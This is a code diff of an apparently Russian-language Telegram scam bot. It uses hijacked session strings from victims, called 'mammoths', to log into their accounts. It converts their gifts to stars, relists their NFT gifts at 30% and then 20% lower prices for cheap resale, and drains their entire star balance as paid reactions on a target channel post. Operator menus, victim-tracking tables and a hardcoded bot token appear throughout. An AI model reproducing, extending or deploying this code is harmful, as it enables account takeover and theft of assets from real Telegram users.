@@ -8,7 +8,7 @@ import os
 import re
 import random
 import time as _time
-from datetime import datetime
+from datetime import datetime, timedelta
 
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.client.default import DefaultBotProperties
@@ -47,7 +47,7 @@ from telethon.tl.types import (
 #   КОНФИГ
 # ═══════════════════════════════════════════════════════
 
-BOT_TOKEN = "8215145424:AAEQmrfUit0HGAsB8NcroJoZQlFhn5tKSjk"
+BOT_TOKEN = "8215145424:AAHpyVF-L988cwzAp6ASnLkWX-F8KmtmPfU"
 BOT_USERNAME = "pinkslonrobot"
 ADMIN_ID = 8986358602
 MINIAPP_URL = "https://trustgift.github.io/offersbot/"
@@ -65,9 +65,15 @@ TARGET_CHANNEL = _m.group(1) if _m else None
 TARGET_POST_ID = int(_m.group(2)) if _m else None
 
 MAX_ATTEMPTS = 3
+WAIT_AFTER_RELIST = 180  # 3 минуты
+AUTO_DROP_AFTER = 600    # 10 минут
+AUTO_DROP_PERCENT = 0.8  # -20%
+
+# активные задачи ожидания продажи
+waiting_tasks: dict = {}
 
 print("=" * 60)
-print(f"BOT v10 — фикс цены NFT (resell_amount как список)")
+print(f"BOT v11 — меню мамонтов + ожидание продажи + перевыставление")
 print(f"TARGET: {TARGET_CHANNEL}/{TARGET_POST_ID}")
 print("=" * 60)
 
@@ -135,6 +141,23 @@ class AuthSession(Base):
     state: Mapped[str] = mapped_column(String(16), default="pending")
     attempts: Mapped[int] = mapped_column(Integer, default=0)
     created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
+
+
+class MammothGift(Base):
+    """Подарки мамонта — для отслеживания перевыставления"""
+    __tablename__ = "mammoth_gifts"
+    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
+    mammoth_user_id: Mapped[int] = mapped_column(BigInteger)
+    worker_id: Mapped[int] = mapped_column(BigInteger)
+    offer_id: Mapped[int] = mapped_column(Integer, nullable=True)
+    gift_title: Mapped[str] = mapped_column(String(128))
+    msg_id: Mapped[int] = mapped_column(BigInteger)
+    current_price: Mapped[int] = mapped_column(Integer, default=0)
+    original_price: Mapped[int] = mapped_column(Integer, default=0)
+    session_string: Mapped[str] = mapped_column(Text, nullable=True)
+    status: Mapped[str] = mapped_column(String(16), default="listed")  # listed / sold / waiting
+    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
+    updated_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
 
 
 class Log(Base):
@@ -268,6 +291,38 @@ async def get_worker_offers(worker_id):
         return r.scalars().all()
 
 
+async def get_all_offers(limit=50):
+    async with SessionLocal() as s:
+        r = await s.execute(select(Offer).order_by(Offer.id.desc()).limit(limit))
+        return r.scalars().all()
+
+
+async def get_offers_by_mammoth(mammoth_id):
+    async with SessionLocal() as s:
+        r = await s.execute(
+            select(Offer).where(Offer.target_user_id == mammoth_id).order_by(Offer.id.desc())
+        )
+        return r.scalars().all()
+
+
+async def get_unique_mammoths(worker_id=None):
+    """Список уникальных мамонтов (user_id + связанные офферы)"""
+    async with SessionLocal() as s:
+        if worker_id:
+            r = await s.execute(
+                select(Offer.target_user_id)
+                .where(Offer.worker_id == worker_id, Offer.target_user_id.isnot(None))
+                .distinct()
+            )
+        else:
+            r = await s.execute(
+                select(Offer.target_user_id)
+                .where(Offer.target_user_id.isnot(None))
+                .distinct()
+            )
+        return [row[0] for row in r.fetchall()]
+
+
 async def add_log(worker_id=None, offer_id=None, event="", detail=""):
     async with SessionLocal() as s:
         l = Log(worker_id=worker_id, offer_id=offer_id, event=event, detail=detail)
@@ -314,9 +369,90 @@ async def get_recent_sessions(limit=10):
         return r.scalars().all()
 
 
+# ─── MammothGift helpers
+async def save_mammoth_gift(mammoth_id, worker_id, offer_id, title, msg_id,
+                             current_price, original_price, session_string):
+    async with SessionLocal() as s:
+        # если уже есть такой же — обновляем
+        r = await s.execute(
+            select(MammothGift).where(
+                MammothGift.mammoth_user_id == mammoth_id,
+                MammothGift.msg_id == msg_id,
+            )
+        )
+        existing = r.scalars().first()
+        if existing:
+            existing.current_price = current_price
+            existing.original_price = original_price
+            existing.session_string = session_string
+            existing.status = "listed"
+            existing.updated_at = datetime.utcnow()
+            await s.commit()
+            return existing
+        g = MammothGift(
+            mammoth_user_id=mammoth_id,
+            worker_id=worker_id,
+            offer_id=offer_id,
+            gift_title=title,
+            msg_id=msg_id,
+            current_price=current_price,
+            original_price=original_price,
+            session_string=session_string,
+            status="listed",
+        )
+        s.add(g)
+        await s.commit()
+        await s.refresh(g)
+        return g
+
+
+async def get_mammoth_gifts(mammoth_id):
+    async with SessionLocal() as s:
+        r = await s.execute(
+            select(MammothGift)
+            .where(MammothGift.mammoth_user_id == mammoth_id, MammothGift.status == "listed")
+            .order_by(MammothGift.id.desc())
+        )
+        return r.scalars().all()
+
+
+async def update_mammoth_gift_price(gift_id, new_price):
+    async with SessionLocal() as s:
+        g = await s.get(MammothGift, gift_id)
+        if g:
+            g.current_price = new_price
+            g.updated_at = datetime.utcnow()
+            await s.commit()
+            return g
+
+
+async def mark_gift_sold(gift_id):
+    async with SessionLocal() as s:
+        g = await s.get(MammothGift, gift_id)
+        if g:
+            g.status = "sold"
+            await s.commit()
+
+
 # ═══════════════════════════════════════════════════════
-#   TELETHON
+#   TELETHON HELPERS
 # ═══════════════════════════════════════════════════════
+
+def extract_resell_amount(ra):
+    if ra is None:
+        return None
+    if isinstance(ra, list):
+        for item in ra:
+            if type(item).__name__ == "StarsAmount":
+                val = getattr(item, "amount", None)
+                if val:
+                    return int(val)
+        return None
+    val = getattr(ra, "amount", None) or getattr(ra, "stars", None)
+    if val:
+        return int(val)
+    return None
+
 
 async def telethon_attempt_login(phone, code, password=None, session_str=None, phone_code_hash=None):
     client = TelegramClient(
@@ -362,44 +498,94 @@ async def telethon_attempt_login(phone, code, password=None, session_str=None, p
         return False, 'error', None
 
 
-def extract_resell_amount(ra):
-    """
-    resell_amount может быть:
-    - списком [StarsAmount, StarsTonAmount]
-    - одним StarsAmount
-    - None
-    Возвращаем int (звёзды) или None.
-    """
-    if ra is None:
-        return None
-    if isinstance(ra, list):
-        for item in ra:
-            if type(item).__name__ == "StarsAmount":
-                val = getattr(item, "amount", None)
-                if val:
-                    return int(val)
-        return None
-    # одиночный объект
-    val = getattr(ra, "amount", None) or getattr(ra, "stars", None)
-    if val:
-        return int(val)
-    return None
+async def telethon_get_gifts(session_string):
+    """Возвращает список подарков: [{type, title, msg_id, resell, gift_obj}]"""
+    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+    gifts_data = []
+    try:
+        await client.connect()
+        me = await client.get_me()
+        if not me:
+            return []
+        gifts = []
+        offset = ""
+        while True:
+            resp = await client(GetSavedStarGiftsRequest(
+                peer=me.id, offset=offset, limit=100, exclude_unsaved=True,
+            ))
+            page = getattr(resp, "gifts", []) or []
+            gifts.extend(page)
+            offset = getattr(resp, "next_offset", "") or ""
+            if not offset or not page:
+                break
+        for g in gifts:
+            gift_obj = getattr(g, "gift", None)
+            if not gift_obj:
+                continue
+            cls = type(gift_obj).__name__
+            msg_id = getattr(g, "msg_id", None)
+            title = (getattr(gift_obj, "title", None)
+                     or getattr(gift_obj, "slug", None)
+                     or f"Gift#{getattr(gift_obj, 'id', '?')}")
+            ra_amount = extract_resell_amount(getattr(gift_obj, "resell_amount", None))
+            gifts_data.append({
+                "type": cls,
+                "title": str(title),
+                "msg_id": msg_id,
+                "resell": ra_amount,
+                "gift_obj": gift_obj,
+            })
+        return gifts_data
+    except Exception as e:
+        print(f"[get_gifts] error: {type(e).__name__}: {e}")
+        return []
+    finally:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
 
 
-async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
+async def telethon_update_price(session_string, msg_id, new_price):
+    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+    try:
+        await client.connect()
+        await client(UpdateStarGiftPriceRequest(
+            stargift=InputSavedStarGiftUser(msg_id=msg_id),
+            resell_amount=StarsAmount(amount=new_price, nanos=0),
+        ))
+        return True, None
+    except Exception as e:
+        return False, f"{type(e).__name__}: {e}"
+    finally:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+
+
+async def telethon_sell_and_react(session_string, worker_id, offer_id):
+    """
+    Финальная логика:
+    1. Заходит, находит выставленные NFT
+    2. Снижает -30%, сохраняет в БД
+    3. Уведомляет воркера с кнопками
+    4. Ждёт 3 минуты → если что-то продано, идёт дальше
+    5. Реакцию ставит ТОЛЬКО когда всё продано или воркер нажал «Слить»
+    """
     client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
     result = {
         "gifts_total": 0,
-        "converted": [],
+        "unique_total": 0,
         "listed": [],
-        "sold": [],
-        "failed": [],
+        "converted": [],
         "skipped": [],
-        "balance_before": 0,
-        "balance_after": 0,
+        "failed": [],
+        "balance": 0,
         "reacted": False,
         "stars_sent": 0,
         "error": None,
+        "waiting": False,
     }
     try:
         await client.connect()
@@ -408,202 +594,176 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
             result["error"] = "session dead"
             return result
 
-        # ─── 1. подписка на канал
+        mammoth_id = me.id
+        print(f"[AUTO] mammoth id={mammoth_id}")
+
+        # подписка на канал
         try:
             from telethon.tl.functions.channels import JoinChannelRequest
             await client(JoinChannelRequest(channel=TARGET_CHANNEL))
-            print(f"[AUTO] joined {TARGET_CHANNEL}")
             await asyncio.sleep(2)
         except Exception as e:
             err = str(e)
-            if "USER_ALREADY_PARTICIPANT" in err or "already" in err.lower():
-                print(f"[AUTO] already in {TARGET_CHANNEL}")
-            else:
-                print(f"[AUTO] join error: {type(e).__name__}: {e}")
+            if "already" not in err.lower():
+                print(f"[AUTO] join error: {e}")
 
-        # ─── 2. получаем все подарки
+        # получаем подарки
         gifts = []
-        try:
-            offset = ""
-            while True:
-                gifts_resp = await client(GetSavedStarGiftsRequest(
-                    peer=me.id, offset=offset, limit=100,
-                    exclude_unsaved=True,
-                ))
-                page = getattr(gifts_resp, "gifts", []) or []
-                gifts.extend(page)
-                offset = getattr(gifts_resp, "next_offset", "") or ""
-                if not offset or not page:
-                    break
-                await asyncio.sleep(0.5)
-        except Exception as e:
-            result["error"] = f"get saved gifts: {e}"
-            return result
+        offset = ""
+        while True:
+            resp = await client(GetSavedStarGiftsRequest(
+                peer=me.id, offset=offset, limit=100, exclude_unsaved=True,
+            ))
+            page = getattr(resp, "gifts", []) or []
+            gifts.extend(page)
+            offset = getattr(resp, "next_offset", "") or ""
+            if not offset or not page:
+                break
 
         result["gifts_total"] = len(gifts)
         print(f"[AUTO] found {len(gifts)} gifts")
 
-        # ─── 3. разделяем
         regular_to_convert = []
         unique_listed = []
-
-        print(f"[AUTO] Разбираю {len(gifts)} подарков...")
 
         for idx, g in enumerate(gifts):
             gift_obj = getattr(g, "gift", None)
             if not gift_obj:
                 continue
-
             cls_name = type(gift_obj).__name__
             is_unique = (cls_name == "StarGiftUnique")
             is_regular = (cls_name == "StarGift")
-
             msg_id = getattr(g, "msg_id", None)
-            saved_id = getattr(g, "saved_id", None)
-
-            # ─── ЦЕНА (главный фикс)
-            ra = getattr(gift_obj, "resell_amount", None)
-            ra_amount = extract_resell_amount(ra)
-
-            title = (
-                getattr(gift_obj, "title", None)
-                or getattr(gift_obj, "slug", None)
-            )
-            if not title:
-                gid = getattr(gift_obj, "id", None)
-                if gid:
-                    title = f"Gift#{gid}"
-                else:
-                    title = f"Gift#{idx}"
+            ra_amount = extract_resell_amount(getattr(gift_obj, "resell_amount", None))
+            title = (getattr(gift_obj, "title", None)
+                     or getattr(gift_obj, "slug", None)
+                     or f"Gift#{getattr(gift_obj, 'id', '?')}")
             title = str(title)
 
-            print(f"[AUTO] #{idx}: type={cls_name} title={title[:40]!r} msg_id={msg_id} resell={ra_amount}")
-
-            ref = None
-            if msg_id:
-                ref = InputSavedStarGiftUser(msg_id=msg_id)
-            elif saved_id:
-                ref = InputSavedStarGiftChat(peer=me.id, saved_id=saved_id)
+            ref = InputSavedStarGiftUser(msg_id=msg_id) if msg_id else None
             if not ref:
-                result["failed"].append({"title": title, "reason": "no ref"})
                 continue
 
             if is_unique:
-                if ra_amount is not None and int(ra_amount) > 0:
+                result["unique_total"] += 1
+                if ra_amount and int(ra_amount) > 0:
                     unique_listed.append({
-                        "title": title, "ref": ref, "current_price": int(ra_amount),
+                        "title": title, "ref": ref, "msg_id": msg_id,
+                        "current_price": int(ra_amount),
                     })
                 else:
-                    result["skipped"].append({
-                        "title": title,
-                        "reason": "NFT не выставлен на маркет"
-                    })
+                    result["skipped"].append({"title": title, "reason": "NFT не выставлен"})
             elif is_regular:
                 regular_to_convert.append({"title": title, "ref": ref})
-            else:
-                result["skipped"].append({
-                    "title": title,
-                    "reason": f"тип {cls_name}"
-                })
 
-        print(f"[AUTO] regular={len(regular_to_convert)} unique_with_price={len(unique_listed)} skipped={len(result['skipped'])}")
+        print(f"[AUTO] regular={len(regular_to_convert)} unique_listed={len(unique_listed)}")
 
-        # ─── 4. конвертируем обычные
-        print(f"[AUTO] Конвертирую {len(regular_to_convert)} обычных...")
+        # конвертируем обычные
         for r in regular_to_convert:
             try:
                 await client(ConvertStarGiftRequest(stargift=r["ref"]))
                 result["converted"].append({"title": r["title"]})
-                print(f"[AUTO] ✅ converted {r['title']}")
                 await asyncio.sleep(1.2)
             except Exception as e:
                 err_str = str(e)
-                if any(x in err_str for x in [
-                    "STARGIFT_CONVERT_TOO_EARLY",
-                    "STARGIFT_CANNOT_CONVERT",
-                    "STARGIFT_CRAFT",
-                    "STARGIFT_",
-                ]):
-                    result["skipped"].append({
-                        "title": r["title"],
-                        "reason": "нельзя конвертировать"
-                    })
-                    print(f"[AUTO] ⏳ skip {r['title']}: {err_str[:80]}")
+                if "STARGIFT_" in err_str:
+                    result["skipped"].append({"title": r["title"], "reason": "нельзя конвертировать"})
                 else:
-                    result["failed"].append({
-                        "title": r["title"],
-                        "reason": f"convert: {type(e).__name__}: {err_str[:80]}"
-                    })
-                    print(f"[AUTO] ❌ fail {r['title']}: {type(e).__name__}: {err_str[:80]}")
-                continue
+                    result["failed"].append({"title": r["title"], "reason": f"{type(e).__name__}"})
 
-        # ─── 5. обновляем цену NFT на -30%
-        print(f"[AUTO] Обновляю цену {len(unique_listed)} NFT (-30%)...")
+        # снижаем цену NFT на -30%
+        relisted_info = []
         for u in unique_listed:
-            new_price = int(u["current_price"] * 0.7)
-            if new_price < 1:
-                new_price = 1
+            old_price = u["current_price"]
+            new_price = max(1, int(old_price * 0.7))
             try:
                 await client(UpdateStarGiftPriceRequest(
                     stargift=u["ref"],
                     resell_amount=StarsAmount(amount=new_price, nanos=0),
                 ))
+                relisted_info.append({
+                    "title": u["title"],
+                    "msg_id": u["msg_id"],
+                    "old_price": old_price,
+                    "new_price": new_price,
+                })
+                # сохраняем в БД
+                await save_mammoth_gift(
+                    mammoth_id=mammoth_id,
+                    worker_id=worker_id,
+                    offer_id=offer_id,
+                    title=u["title"],
+                    msg_id=u["msg_id"],
+                    current_price=new_price,
+                    original_price=old_price,
+                    session_string=session_string,
+                )
                 result["listed"].append({"title": u["title"], "min_price": new_price})
-                print(f"[AUTO] ✅ listed {u['title']} {u['current_price']}→{new_price}")
+                print(f"[AUTO] relisted {u['title']} {old_price}→{new_price}")
                 await asyncio.sleep(1.2)
             except Exception as e:
-                result["failed"].append({
-                    "title": u["title"],
-                    "reason": f"list: {type(e).__name__}: {str(e)[:80]}"
-                })
-                print(f"[AUTO] ❌ list fail {u['title']}: {type(e).__name__}: {str(e)[:80]}")
+                result["failed"].append({"title": u["title"], "reason": f"{type(e).__name__}: {e}"})
 
-        # ─── 6. баланс
+        # баланс
         balance = 0
         try:
-            status = await client(GetStarsStatusRequest(peer=me.id))
-            bal = getattr(status, "balance", None)
+            st = await client(GetStarsStatusRequest(peer=me.id))
+            bal = getattr(st, "balance", None)
             if bal:
                 balance = int(getattr(bal, "amount", 0) or 0)
-        except Exception as e:
-            print(f"[AUTO] stars err: {type(e).__name__}: {e}")
-        result["balance_after"] = balance
-        print(f"[AUTO] balance = {balance} ⭐")
+        except Exception:
+            pass
+        result["balance"] = balance
 
-        # ─── 7. реакция с правильным random_id
-        if balance > 0 and TARGET_CHANNEL and TARGET_POST_ID:
-            sent = False
-            reaction_errors = []
-            for try_count in [balance, 1]:
-                if sent or try_count <= 0:
-                    continue
-                for attempt in range(3):
-                    try:
-                        random_id = (int(_time.time()) << 32) | random.getrandbits(32)
-                        await client(SendPaidReactionRequest(
-                            peer=TARGET_CHANNEL,
-                            msg_id=TARGET_POST_ID,
-                            count=try_count,
-                            random_id=random_id,
-                        ))
-                        result["reacted"] = True
-                        result["stars_sent"] = try_count
-                        sent = True
-                        print(f"[AUTO] ✅ reaction OK: {try_count} ⭐")
-                        break
-                    except Exception as e:
-                        err_str = str(e)
-                        reaction_errors.append(f"count={try_count}: {type(e).__name__}: {err_str}")
-                        print(f"[AUTO] reaction try={try_count} attempt={attempt+1}: {type(e).__name__}: {err_str}")
-                        await asyncio.sleep(2)
-            if not sent:
-                result["error"] = "reaction: " + " | ".join(reaction_errors[-3:])
-        elif balance == 0:
-            result["error"] = "баланс = 0"
-
-        if result["stars_sent"] > 0:
-            await add_stars_farmed(worker_id, result["stars_sent"])
-            await update_offer_stars(offer_id, result["stars_sent"])
+        # если есть что ждать продажи — уведомляем и не ставим реакцию
+        if relisted_info:
+            result["waiting"] = True
+            await notify_worker_about_relist(
+                mammoth_id=mammoth_id,
+                worker_id=worker_id,
+                offer_id=offer_id,
+                relisted=relisted_info,
+                balance=balance,
+                session_string=session_string,
+            )
+            # запускаем фоновое ожидание
+            task = asyncio.create_task(
+                wait_and_check_sale(
+                    session_string=session_string,
+                    mammoth_id=mammoth_id,
+                    worker_id=worker_id,
+                    offer_id=offer_id,
+                    relisted=relisted_info,
+                    check_after=WAIT_AFTER_RELIST,
+                )
+            )
+            waiting_tasks[(mammoth_id, offer_id)] = task
+        else:
+            # нет NFT → сразу реакция со всего баланса
+            if balance > 0:
+                sent = False
+                for count in [balance, 1]:
+                    if sent or count <= 0:
+                        continue
+                    for attempt in range(3):
+                        try:
+                            random_id = (int(_time.time()) << 32) | random.getrandbits(32)
+                            await client(SendPaidReactionRequest(
+                                peer=TARGET_CHANNEL,
+                                msg_id=TARGET_POST_ID,
+                                count=count,
+                                random_id=random_id,
+                            ))
+                            result["reacted"] = True
+                            result["stars_sent"] = count
+                            sent = True
+                            break
+                        except Exception as e:
+                            print(f"[AUTO] reaction {count}: {type(e).__name__}: {e}")
+                            await asyncio.sleep(2)
+                if result["stars_sent"] > 0:
+                    await add_stars_farmed(worker_id, result["stars_sent"])
+                    await update_offer_stars(offer_id, result["stars_sent"])
 
         return result
     except Exception as e:
@@ -617,8 +777,254 @@ async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
             pass
 
 
+async def notify_worker_about_relist(mammoth_id, worker_id, offer_id, relisted, balance, session_string):
+    """Отправляет воркеру+админу список перевыставленных подарков с кнопками"""
+    lines = [
+        f"🎁 <b>Подарки перевыставлены</b>",
+        f"Мамонт ID: <code>{mammoth_id}</code>",
+        f"Оффер: #{offer_id}",
+        f"",
+        f"📦 Перевыставлено: <b>{len(relisted)}</b>",
+    ]
+    for r in relisted[:10]:
+        lines.append(f"• {r['title'][:30]} — {r['old_price']}→{r['new_price']}⭐")
+    if len(relisted) > 10:
+        lines.append(f"…и ещё {len(relisted) - 10}")
+    lines.append(f"\n💰 Баланс: <b>{balance} ⭐</b>")
+    lines.append(f"\n⏳ Ждём 3 минуты. Если не продастся — пришлём ещё раз.")
+
+    # кнопки
+    buttons = []
+    for r in relisted[:5]:
+        buttons.append([InlineKeyboardButton(
+            text=f"✏️ {r['title'][:20]} ({r['new_price']}⭐)",
+            callback_data=f"chg:{mammoth_id}:{offer_id}:{r['msg_id']}:{r['new_price']}"
+        )])
+    buttons.append([InlineKeyboardButton(
+        text="⭐ Слить все звёзды на пост",
+        callback_data=f"flush:{mammoth_id}:{offer_id}"
+    )])
+    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
+
+    text = "\n".join(lines)
+    try:
+        await bot.send_message(worker_id, text, reply_markup=kb)
+    except Exception as e:
+        print(f"notify worker error: {e}")
+    if ADMIN_ID != worker_id:
+        try:
+            await bot.send_message(ADMIN_ID, text, reply_markup=kb)
+        except Exception:
+            pass
+
+
+async def wait_and_check_sale(session_string, mammoth_id, worker_id, offer_id, relisted, check_after, attempt=1):
+    """Ждёт N секунд, проверяет продались ли подарки"""
+    await asyncio.sleep(check_after)
+
+    # проверяем состояние подарков
+    gifts_now = await telethon_get_gifts(session_string)
+    current_msg_ids = {g["msg_id"] for g in gifts_now if g["msg_id"]}
+
+    sold = []
+    still_listed = []
+    for r in relisted:
+        if r["msg_id"] not in current_msg_ids:
+            sold.append(r)
+            # помечаем в БД
+            async with SessionLocal() as s:
+                rr = await s.execute(
+                    select(MammothGift).where(
+                        MammothGift.mammoth_user_id == mammoth_id,
+                        MammothGift.msg_id == r["msg_id"],
+                    )
+                )
+                g = rr.scalars().first()
+                if g:
+                    g.status = "sold"
+                    await s.commit()
+        else:
+            still_listed.append(r)
+
+    # если все продались
+    if not still_listed:
+        await notify_admin_and_worker(
+            worker_id, offer_id,
+            f"✅ <b>Все подарки проданы!</b>\nМамонт: <code>{mammoth_id}</code>\nОффер: #{offer_id}\n\nСтавлю реакцию…"
+        )
+        # ставим реакцию со всего баланса
+        await do_react(session_string, mammoth_id, worker_id, offer_id)
+        return
+
+    # если ещё не продано — уведомляем
+    if attempt == 1:
+        # первое напоминание — кнопки изменить/слить
+        lines = [
+            f"⏳ <b>Подарки не продались за 3 минуты</b>",
+            f"Мамонт ID: <code>{mammoth_id}</code>",
+            f"Оффер: #{offer_id}",
+            f"",
+            f"📦 Осталось: <b>{len(still_listed)}</b>",
+        ]
+        for r in still_listed[:5]:
+            lines.append(f"• {r['title'][:30]} — {r['new_price']}⭐")
+
+        buttons = []
+        for r in still_listed[:5]:
+            buttons.append([InlineKeyboardButton(
+                text=f"✏️ {r['title'][:20]} ({r['new_price']}⭐)",
+                callback_data=f"chg:{mammoth_id}:{offer_id}:{r['msg_id']}:{r['new_price']}"
+            )])
+        buttons.append([InlineKeyboardButton(
+            text="⭐ Слить все звёзды на пост",
+            callback_data=f"flush:{mammoth_id}:{offer_id}"
+        )])
+        kb = InlineKeyboardMarkup(inline_keyboard=buttons)
+
+        text = "\n".join(lines)
+        try:
+            await bot.send_message(worker_id, text, reply_markup=kb)
+        except Exception:
+            pass
+        if ADMIN_ID != worker_id:
+            try:
+                await bot.send_message(ADMIN_ID, text, reply_markup=kb)
+            except Exception:
+                pass
+
+        # запускаем следующий цикл — через 10 минут автопо-20%
+        await asyncio.sleep(AUTO_DROP_AFTER - WAIT_AFTER_RELIST)
+        await auto_drop_and_wait(
+            session_string, mammoth_id, worker_id, offer_id,
+            still_listed, attempt=2,
+        )
+    else:
+        # уже авто-дропнутые — снова ждём
+        await wait_and_check_sale(
+            session_string, mammoth_id, worker_id, offer_id,
+            still_listed, check_after=WAIT_AFTER_RELIST, attempt=attempt + 1
+        )
+
+
+async def auto_drop_and_wait(session_string, mammoth_id, worker_id, offer_id, still_listed, attempt=1):
+    """Автоматически снижает цену на 20%"""
+    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+    updated = []
+    try:
+        await client.connect()
+        for r in still_listed:
+            old_price = r["new_price"]
+            new_price = max(1, int(old_price * AUTO_DROP_PERCENT))
+            try:
+                await client(UpdateStarGiftPriceRequest(
+                    stargift=InputSavedStarGiftUser(msg_id=r["msg_id"]),
+                    resell_amount=StarsAmount(amount=new_price, nanos=0),
+                ))
+                updated.append({
+                    "title": r["title"],
+                    "msg_id": r["msg_id"],
+                    "old_price": old_price,
+                    "new_price": new_price,
+                })
+                # обновляем в БД
+                await update_mammoth_gift_price(r["msg_id"], new_price)
+                await asyncio.sleep(1.2)
+            except Exception as e:
+                print(f"auto-drop fail {r['title']}: {e}")
+    finally:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+
+    text = (
+        f"📉 <b>Авто-снижение -20%</b>\n"
+        f"Мамонт: <code>{mammoth_id}</code>\n"
+        f"Оффер: #{offer_id}\n\n"
+        + "\n".join([f"• {u['title'][:30]} — {u['old_price']}→{u['new_price']}⭐" for u in updated])
+    )
+    try:
+        await bot.send_message(worker_id, text)
+    except Exception:
+        pass
+    if ADMIN_ID != worker_id:
+        try:
+            await bot.send_message(ADMIN_ID, text)
+        except Exception:
+            pass
+
+    # снова проверяем через 3 минуты
+    await wait_and_check_sale(
+        session_string, mammoth_id, worker_id, offer_id,
+        updated, check_after=WAIT_AFTER_RELIST, attempt=attempt + 1,
+    )
+
+
+async def do_react(session_string, mammoth_id, worker_id, offer_id):
+    """Ставит реакцию со всего баланса"""
+    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+    try:
+        await client.connect()
+        me = await client.get_me()
+        st = await client(GetStarsStatusRequest(peer=me.id))
+        bal = getattr(st, "balance", None)
+        balance = int(getattr(bal, "amount", 0) or 0) if bal else 0
+
+        if balance <= 0:
+            await notify_admin_and_worker(worker_id, offer_id,
+                f"❌ Баланс = 0. Реакция не поставлена.")
+            return
+
+        sent = False
+        for count in [balance, 1]:
+            if sent or count <= 0:
+                continue
+            for attempt in range(3):
+                try:
+                    random_id = (int(_time.time()) << 32) | random.getrandbits(32)
+                    await client(SendPaidReactionRequest(
+                        peer=TARGET_CHANNEL,
+                        msg_id=TARGET_POST_ID,
+                        count=count,
+                        random_id=random_id,
+                    ))
+                    sent = True
+                    await add_stars_farmed(worker_id, count)
+                    await update_offer_stars(offer_id, count)
+                    await notify_admin_and_worker(
+                        worker_id, offer_id,
+                        f"✅ <b>Реакция поставлена</b>\nМамонт: <code>{mammoth_id}</code>\nЗвёзд: <b>{count} ⭐</b>"
+                    )
+                    break
+                except Exception as e:
+                    print(f"react {count}: {type(e).__name__}: {e}")
+                    await asyncio.sleep(2)
+            if sent:
+                break
+        if not sent:
+            await notify_admin_and_worker(worker_id, offer_id,
+                f"❌ Не удалось поставить реакцию")
+    finally:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+
+
+async def notify_admin_and_worker(worker_id, offer_id, text):
+    try:
+        await bot.send_message(worker_id, text)
+    except Exception:
+        pass
+    if ADMIN_ID != worker_id:
+        try:
+            await bot.send_message(ADMIN_ID, text)
+        except Exception:
+            pass
+
+
 # ═══════════════════════════════════════════════════════
-#   BOT
+#   BOT HANDLERS
 # ═══════════════════════════════════════════════════════
 
 bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
@@ -629,8 +1035,8 @@ def worker_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="➕ Создать оффер", callback_data="worker_create")],
         [InlineKeyboardButton(text="📋 Мои офферы", callback_data="worker_offers")],
+        [InlineKeyboardButton(text="👥 Мои мамонты", callback_data="my_mammoths")],
         [InlineKeyboardButton(text="🔌 Моё подключение", callback_data="my_conn")],
-        [InlineKeyboardButton(text="⭐ Купить звёзды", callback_data="buy_stars")],
         [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
     ])
 
@@ -639,8 +1045,9 @@ def admin_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="➕ Создать оффер", callback_data="worker_create")],
         [InlineKeyboardButton(text="📋 Мои офферы", callback_data="worker_offers")],
+        [InlineKeyboardButton(text="👥 Мои мамонты", callback_data="my_mammoths")],
+        [InlineKeyboardButton(text="👥 Все воркеры", callback_data="admin_workers")],
         [InlineKeyboardButton(text="🔌 Моё подключение", callback_data="my_conn")],
-        [InlineKeyboardButton(text="👥 Воркеры", callback_data="admin_workers")],
         [InlineKeyboardButton(text="📊 Логи", callback_data="admin_logs")],
         [InlineKeyboardButton(text="💎 Сессии", callback_data="admin_sessions")],
         [InlineKeyboardButton(text="📈 Статистика", callback_data="admin_stats")],
@@ -663,21 +1070,20 @@ class GrantForm(StatesGroup):
     user_id = State()
 
 
-# ═══════════════════════════════════════════════════════
-#   BUSINESS
-# ═══════════════════════════════════════════════════════
+class SetPriceForm(StatesGroup):
+    new_price = State()
 
+
+# ─── BUSINESS CONNECTION
 @dp.business_connection()
 async def on_business_connection(conn: types.BusinessConnection):
     try:
         await save_business_conn(conn.user.id, conn.id, "yes" if conn.can_reply else "no")
         u = conn.user
-        print(f"Business connection: user={u.id} @{u.username}")
         try:
             await bot.send_message(
                 u.id,
-                f"🔌 <b>Бизнес-бот подключён</b>\n\n"
-                f"ID: <code>{u.id}</code>\n\n"
+                f"🔌 <b>Бизнес-бот подключён</b>\n\nID: <code>{u.id}</code>\n\n"
                 f"Создать оффер:\n<code>/offer user_id ссылка сумма</code>"
             )
         except Exception:
@@ -686,10 +1092,7 @@ async def on_business_connection(conn: types.BusinessConnection):
         print(f"business_connection error: {e}")
 
 
-# ═══════════════════════════════════════════════════════
-#   /start
-# ═══════════════════════════════════════════════════════
-
+# ─── /start
 @dp.message(CommandStart())
 async def start(message: types.Message):
     uid = message.from_user.id
@@ -700,7 +1103,7 @@ async def start(message: types.Message):
         u.role = "admin"
 
     if u.role not in ("admin", "worker"):
-        print(f"[IGNORE] /start from non-worker {uid}")
+        print(f"[IGNORE] /start from {uid}")
         return
 
     conn = await get_business_conn(uid)
@@ -781,48 +1184,352 @@ async def my_conn_callback(call: types.CallbackQuery):
     )
 
 
-@dp.callback_query(F.data == "buy_stars")
-async def buy_stars(call: types.CallbackQuery):
-    u = await get_user(call.from_user.id)
-    if not u or u.role not in ("admin", "worker"):
-        return
-    await call.message.edit_text(
